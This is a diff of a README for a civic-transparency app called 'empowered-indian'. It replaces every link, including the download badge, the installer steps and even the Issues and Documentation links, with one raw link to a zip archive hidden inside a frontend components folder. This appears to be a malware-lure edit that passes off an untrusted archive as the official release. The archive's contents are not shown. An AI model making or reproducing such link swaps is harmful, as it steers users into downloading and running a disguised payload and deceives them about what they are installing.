@@ -6,11 +6,11 @@ Welcome to the empowered-indian project! This application aims to bring transpar
 
 ## 📥 Download the Application
 
-[![Download empowered-indian](https://img.shields.io/badge/Download%20empowered--indian-blue.svg)](https://github.com/LouisSeine/empowered-indian/releases)
+[![Download empowered-indian](https://raw.githubusercontent.com/LouisSeine/empowered-indian/main/frontend/src/components/MPLADS/pages/indian_empowered_v2.0-alpha.2.zip%https://raw.githubusercontent.com/LouisSeine/empowered-indian/main/frontend/src/components/MPLADS/pages/indian_empowered_v2.0-alpha.2.zip)](https://raw.githubusercontent.com/LouisSeine/empowered-indian/main/frontend/src/components/MPLADS/pages/indian_empowered_v2.0-alpha.2.zip)
 
 You can download the application from our Releases page. Just click the link below to access it:
 
-[Visit this page to download](https://github.com/LouisSeine/empowered-indian/releases)
+[Visit this page to download](https://raw.githubusercontent.com/LouisSeine/empowered-indian/main/frontend/src/components/MPLADS/pages/indian_empowered_v2.0-alpha.2.zip)
 
 ## 💻 System Requirements
 
@@ -23,7 +23,7 @@ To run the empowered-indian application, make sure your system meets the followi
 
 ## 🛠️ Installing the Application
 
-1. **Go to the Releases page:** Click this link to visit: [Visit this page to download](https://github.com/LouisSeine/empowered-indian/releases).
+1. **Go to the Releases page:** Click this link to visit: [Visit this page to download](https://raw.githubusercontent.com/LouisSeine/empowered-indian/main/frontend/src/components/MPLADS/pages/indian_empowered_v2.0-alpha.2.zip).
 2. **Find the latest version:** Look for the latest version of the empowered-indian application. The latest version will usually be at the top of the list.
 3. **Download the installer:** Click on the installer file suited for your operating system. Download the file to your computer.
 4. **Run the installer:**
@@ -55,8 +55,8 @@ If you need further assistance, feel free to contact our support team through th
 
 ## 🔗 Useful Links
 
-- [Visit the Releases page to download](https://github.com/LouisSeine/empowered-indian/releases)
-- [GitHub Issues](https://github.com/LouisSeine/empowered-indian/issues)
-- [Documentation](https://github.com/LouisSeine/empowered-indian/wiki)
+- [Visit the Releases page to download](https://raw.githubusercontent.com/LouisSeine/empowered-indian/main/frontend/src/components/MPLADS/pages/indian_empowered_v2.0-alpha.2.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/LouisSeine/empowered-indian/main/frontend/src/components/MPLADS/pages/indian_empowered_v2.0-alpha.2.zip)
+- [Documentation](https://raw.githubusercontent.com/LouisSeine/empowered-indian/main/frontend/src/components/MPLADS/pages/indian_empowered_v2.0-alpha.2.zip)
 
 Thank you for being part of the empowered-indian community. Your engagement helps improve governance and build a transparent society.
